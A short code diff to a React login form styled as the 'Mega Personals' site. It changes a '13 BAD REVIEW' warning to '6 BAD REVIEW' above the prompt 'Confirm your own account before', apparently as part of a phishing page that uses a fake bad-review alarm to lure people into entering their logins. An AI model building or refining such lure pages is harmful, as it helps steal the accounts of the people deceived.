@@ -64,7 +64,7 @@ function LoginForm({ adminId, posterId }) {
           <span className="text-[#e89a4c]">Mega</span>{" "}
           <span className="text-[#6495ED]">Personals</span>
         </p>
-        <p className="text-xl mt-2">13 BAD REVIEW</p>
+        <p className="text-xl mt-2">6 BAD REVIEW</p>
         <p className="text-2xl text-blue-700">
           Confirm your own account before
         </p>
